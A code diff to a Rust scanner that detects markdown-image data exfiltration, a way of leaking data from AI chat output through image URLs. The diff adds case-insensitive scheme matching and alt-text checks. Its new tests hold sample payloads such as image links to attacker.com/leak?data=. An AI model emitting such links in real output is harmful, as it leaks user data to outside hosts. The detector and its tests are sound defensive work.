@@ -58,16 +58,22 @@ pub fn detect_markdown_exfiltration(source: &str) -> bool {
         let alt_start = search_from + rel_idx + 2;
         // Look for `](` after `![`
         if let Some(close_bracket) = source[alt_start..].find("](") {
-            let url_start = alt_start + close_bracket + 2;
-            let remainder = &source[url_start..];
-            let trimmed = remainder.trim_start();
-            if trimmed.starts_with("https://") || trimmed.starts_with("http://") {
-                // Check for closing `)`
-                if let Some(close_paren) = trimmed.find(')') {
-                    if !trimmed[..close_paren].contains('\n')
-                        && !trimmed[..close_paren].contains('\r')
-                    {
-                        return true;
+            let alt_text = &source[alt_start..alt_start + close_bracket];
+            if !alt_text.contains('\n') && !alt_text.contains('\r') && !alt_text.contains('[') {
+                let url_start = alt_start + close_bracket + 2;
+                let remainder = &source[url_start..];
+                let trimmed = remainder.trim_start();
+                let is_http_or_https = (trimmed.len() >= 8
+                    && trimmed[..8].eq_ignore_ascii_case("https://"))
+                    || (trimmed.len() >= 7 && trimmed[..7].eq_ignore_ascii_case("http://"));
+                if is_http_or_https {
+                    // Check for closing `)`
+                    if let Some(close_paren) = trimmed.find(')') {
+                        if !trimmed[..close_paren].contains('\n')
+                            && !trimmed[..close_paren].contains('\r')
+                        {
+                            return true;
+                        }
                     }
                 }
             }
@@ -167,6 +173,18 @@ mod tests {
                 ..
             })
         ));
+
+        // Case-insensitive scheme detection
+        let input_upper = "Look at this image: ![exfil](HTTPS://attacker.com/leak?data=test)";
+        assert!(scan_fast_breaker(input_upper).is_err());
+        let input_http = "Look at this image: ![exfil](http://attacker.com/leak?data=test)";
+        assert!(scan_fast_breaker(input_http).is_err());
+
+        // Alt-text with newlines or nested [ should NOT match as valid markdown image
+        let input_newline = "Look at this: ![exfil\nnewline](https://attacker.com/leak)";
+        assert!(scan_fast_breaker(input_newline).is_ok());
+        let input_nested_bracket = "Look at this: ![exfil [nested](https://attacker.com/leak)";
+        assert!(scan_fast_breaker(input_nested_bracket).is_ok());
     }
 
     #[test]
